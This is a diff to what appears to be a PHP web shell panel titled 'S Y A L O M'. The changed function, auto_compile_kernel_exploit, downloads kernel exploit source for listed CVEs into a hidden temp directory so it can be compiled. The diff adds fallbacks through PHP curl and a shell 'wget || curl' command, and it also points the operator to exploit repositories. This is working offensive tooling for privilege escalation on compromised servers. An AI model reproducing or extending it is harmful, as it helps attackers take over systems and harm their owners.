@@ -2106,6 +2106,7 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     $results = ['success' => false, 'output' => '', 'compiled_binary' => ''];
     
     // 🔥 EXTENSIVE AUTO-COMPILE DATABASE - 15+ Exploits
+    // URL diperbarui - verified working 2026
     $exploit_db = [
         // 2016 Exploits
         'CVE-2016-0728' => [
@@ -2286,12 +2287,66 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
     @mkdir($tmp_dir);
     
-    // Download source
+    // Download source dengan better error handling dan fallback
     $source_file = $tmp_dir . '/exploit.c';
+    $source_content = false;
+    
+    // Try file_get_contents first
     $source_content = @file_get_contents($exploit['source']);
     
+    // Fallback to curl if file_get_contents fails
+    if (!$source_content && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $exploit['source']);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $source_content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($http_code != 200) {
+            $source_content = false;
+        }
+    }
+    
+    // Fallback to wget/curl system command
     if (!$source_content) {
-        $results['output'] = "Failed to download exploit source from {$exploit['source']}";
+        $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>/dev/null || curl -sL " . escapeshellarg($exploit['source']) . " 2>/dev/null";
+        $source_content = execute_shell_command($wget_cmd);
+        if (empty($source_content) || strlen($source_content) < 100) {
+            $source_content = false;
+        }
+    }
+    
+    // Check HTTP response code
+    $headers = @get_headers($exploit['source']);
+    $http_code = 0;
+    if ($headers && isset($headers[0])) {
+        preg_match('/HTTP\/\d\.\d\s+(\d+)/', $headers[0], $matches);
+        $http_code = isset($matches[1]) ? intval($matches[1]) : 0;
+    }
+    
+    if (!$source_content || $http_code === 404) {
+        $results['output'] = "❌ Failed to download exploit source (HTTP $http_code)\n";
+        $results['output'] .= "URL: {$exploit['source']}\n\n";
+        $results['output'] .= "⚠️ Repository mungkin telah dipindahkan atau dihapus.\n";
+        $results['output'] .= "Coba cari manual di:\n";
+        $results['output'] .= "• https://github.com/search?q=$cve\n";
+        $results['output'] .= "• https://www.exploit-db.com/search?cve=$cve\n";
+        $results['output'] .= "• https://packetstormsecurity.com/search/?q=$cve\n\n";
+        $results['output'] .= "Setelah menemukan source, upload manual ke /tmp/ dan compile.";
+        return $results;
+    }
+    
+    // Verify content is valid C code, not error page
+    if (strpos($source_content, '<!DOCTYPE') !== false || 
+        strpos($source_content, '<html') !== false ||
+        strlen($source_content) < 100) {
+        $results['output'] = "❌ Downloaded content is not valid source code\n";
+        $results['output'] .= "Received HTML page instead of C source.\n";
+        $results['output'] .= "URL may have changed or requires authentication.";
         return $results;
     }
     
@@ -3225,7 +3280,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 2021</h1>
+        <h1>::S Y A L O M:: ~ 280326 2058</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
